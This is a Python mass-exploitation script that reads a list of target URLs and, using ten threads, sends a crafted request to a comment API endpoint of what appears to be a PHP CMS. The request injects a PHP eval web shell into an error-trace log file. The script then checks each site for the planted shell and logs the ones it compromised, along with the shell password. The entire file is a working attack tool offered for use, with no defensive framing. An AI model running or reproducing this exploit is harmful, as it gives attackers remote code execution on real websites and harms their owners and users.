#!/usr/bin/env python3
#-*- encoding:utf-8 -*-

import base64
import requests
import threading
import queue

q=queue.Queue()
file=open('url.txt')
for x in file.readlines():
        q.put(x.strip())
print("============Write the shell started!==============\n")
#写命令执行马
def cmd():
        while not q.empty():
                url=q.get()
                headers={'Content-Type':'text/xml','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:52.0) Gecko/20100101 Firefox/52.'}
                requests.packages.urllib3.disable_warnings()
                try:
                        get=requests.get(url=url+'/comment/api/index.php?gid=1&page=2&rlist[]=11*/?><?php @eval($_POST['c']);echo "123";/*',headers=headers,verify=False,timeout=10)
                        r = requests.get(url=url+'/data/mysqli_error_trace.php',headers=headers,timeout=10,verify=False)
                        if '123' in r.text:
                                print ('!=========Write to successful :'+url+'/data/mysqli_error_trace.php'+'=======password:c========!!!\n')
                                with open('success.txt','a') as f:
                                        f.write(url+'\n')
                        else:
                                pass
                except:
                        pass

#线程队列部分
th=[]
th_num=10
for x in range(th_num):
        t=threading.Thread(target=cmd)
        th.append(t)
for x in range(th_num):
        th[x].start()
for x in range(th_num):
        th[x].join()
